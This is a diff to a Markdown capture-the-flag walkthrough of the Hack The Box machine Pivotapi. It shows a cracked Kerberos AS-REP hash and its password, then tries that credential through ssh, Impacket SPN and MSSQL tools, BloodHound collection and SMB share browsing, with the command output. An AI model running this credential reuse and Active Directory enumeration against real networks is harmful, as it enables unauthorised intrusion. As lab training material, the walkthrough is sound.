@@ -259,8 +259,91 @@ OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 1
 ...
 $krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441:Roper4155
 ```
+- The creds didn't work for `ssh`
+```
+└─$ sshpass -p 'Roper4155' ssh kaorz@10.10.10.240
+Warning: Permanently added '10.10.10.240' (ED25519) to the list of known hosts.
+Permission denied, please try again.
+```
 
+- No `SPN`s
+```
+└─$ impacket-GetUserSPNs LicorDeBellota.htb/Kaorz:'Roper4155' -dc-ip 10.10.10.240  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+No entries found!
+```
+- No access to `mysql`
+```
+└─$ impacket-mssqlclient LicorDeBellota.htb/Kaorz:'Roper4155'@10.10.10.240 -windows-auth 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'LICORDEBELLOTA\Kaorz'.
+                                                                                                             
+```
 ## User
+- Let's check `bloodhound`
+```
+└─$ bloodhound-python -u kaorz -p 'Roper4155' -d licordebellota.htb -dc licordebellota.htb -ns 10.10.10.240 --zip
+INFO: Found AD domain: licordebellota.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: licordebellota.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Found 28 users
+INFO: Connecting to LDAP server: licordebellota.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 58 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: PivotAPI.LicorDeBellota.htb
+INFO: Done in 00M 16S
+INFO: Compressing output into 20231007112624_bloodhound.zip
+```
 
+- Nothing interesting
+  - `Domain Users`
 
+![](./images/1.png)
+
+- I'll check `smb`
+```
+└─$ smbclient -L //10.10.10.240/ -U 'kaorz%Roper4155'                                        
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Admin remota
+        C$              Disk      Recurso predeterminado
+        IPC$            IPC       IPC remota
+        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
+        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+- We have files in `Netlogon\HelpDesk`
+```
+└─$ smbclient //10.10.10.240/NETLOGON -U 'kaorz%Roper4155'           
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Aug  8 11:42:28 2020
+  ..                                  D        0  Sat Aug  8 11:42:28 2020
+  HelpDesk                            D        0  Sun Aug  9 16:40:36 2020
+
+                5158399 blocks of size 4096. 1053109 blocks available
+smb: \> cd HelpDesk\
+smb: \HelpDesk\> ls
+  .                                   D        0  Sun Aug  9 16:40:36 2020
+  ..                                  D        0  Sun Aug  9 16:40:36 2020
+  Restart-OracleService.exe           A  1854976  Fri Feb 19 10:52:01 2021
+  Server MSSQL.msg                    A    24576  Sun Aug  9 12:04:14 2020
+  WinRM Service.msg                   A    26112  Sun Aug  9 12:42:20 2020
+
+                5158399 blocks of size 4096. 1053109 blocks available
+
+```
 ## Root
